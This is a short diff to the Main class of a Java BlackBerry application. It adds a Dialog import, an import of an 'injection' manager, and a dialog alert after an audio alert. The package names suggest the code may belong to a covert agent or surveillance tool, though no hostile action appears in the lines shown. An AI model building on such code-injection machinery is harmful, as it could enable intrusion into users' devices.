@@ -14,11 +14,13 @@ import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import net.rim.device.api.ui.component.Dialog;
 import blackberry.config.Cfg;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.InjectorManager;
 import blackberry.utils.Utils;
 
 /**
@@ -130,6 +132,12 @@ public class Main extends UiApplication {
                     1400, 35 };
             try {
                 Alert.startAudio(fire, 100);
+                UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+                    public void run() {
+                        Dialog.alert(Messages.getString("C.2"));
+                    }
+                });
+               
             } catch (Exception e) {
 
             }
